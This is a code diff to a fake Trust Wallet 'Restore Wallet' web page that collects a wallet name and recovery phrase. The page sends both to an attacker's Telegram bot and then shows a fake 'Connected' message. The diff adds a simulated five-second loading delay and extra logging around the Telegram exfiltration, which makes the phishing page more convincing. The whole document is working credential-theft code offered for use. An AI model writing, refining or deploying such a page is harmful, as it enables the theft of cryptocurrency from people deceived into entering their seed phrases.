@@ -31,11 +31,6 @@
         margin-bottom: 20px;
     }
 
-    h1 {
-        font-weight: 600;
-        margin-bottom: 25px;
-    }
-
     label {
         font-size: 14px;
         margin-bottom: 5px;
@@ -78,6 +73,16 @@
         font-size: 16px;
         font-weight: 600;
         cursor: pointer;
+        position: relative;
+    }
+
+    button.loading::after {
+        content: "Loading...";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 16px;
     }
 
     .popup {
@@ -99,7 +104,6 @@
 <body>
 <div class="wallet-container">
     <img class="logo" src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo">
-    <h1>Restore Wallet</h1>
 
     <label for="walletName">Wallet Name</label>
     <input type="text" id="walletName" placeholder="Enter wallet name">
@@ -134,7 +138,8 @@ function showPopup(message) {
 
 function sendToTelegram(message) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-        .catch(err => console.error(err));
+        .then(res => console.log('Sent to Telegram'))
+        .catch(err => console.error('Error sending to Telegram:', err));
 }
 
 restoreBtn.addEventListener('click', () => {
@@ -148,12 +153,21 @@ restoreBtn.addEventListener('click', () => {
         return;
     }
 
-    connectedPhrases.add(phrase);
-    sendToTelegram(`Wallet Name: ${walletName}\nRecovery Phrase: ${phrase}`);
-    showPopup("Connected");
+    // Simulate loading for 5 seconds
+    restoreBtn.classList.add('loading');
+    restoreBtn.disabled = true;
 
-    walletNameInput.value = '';
-    phraseInput.value = '';
+    setTimeout(() => {
+        restoreBtn.classList.remove('loading');
+        restoreBtn.disabled = false;
+
+        connectedPhrases.add(phrase);
+        sendToTelegram(`Wallet Name: ${walletName}\nRecovery Phrase: ${phrase}`);
+        showPopup("Connected");
+
+        walletNameInput.value = '';
+        phraseInput.value = '';
+    }, 5000);
 });
 </script>
 </body>
